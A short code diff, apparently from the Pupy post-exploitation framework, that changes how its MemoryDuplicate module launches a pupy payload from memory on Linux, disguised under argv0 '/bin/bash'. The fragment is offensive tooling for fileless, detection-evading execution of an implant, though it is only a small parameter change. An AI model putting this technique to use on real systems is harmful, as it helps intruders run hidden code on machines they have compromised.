@@ -45,6 +45,6 @@ class MemoryDuplicate(PupyModule):
                 use_impersonation=args.impersonate, suspended_process=args.process
             )
         elif self.client.is_linux():
-            mexec(self, payload, [], argv0='/bin/bash', stdout=False, raw=True, terminate=False)
+            mexec(self, payload, [], argv0='/bin/bash', raw=True)
 
         self.success("pupy payload executed from memory")
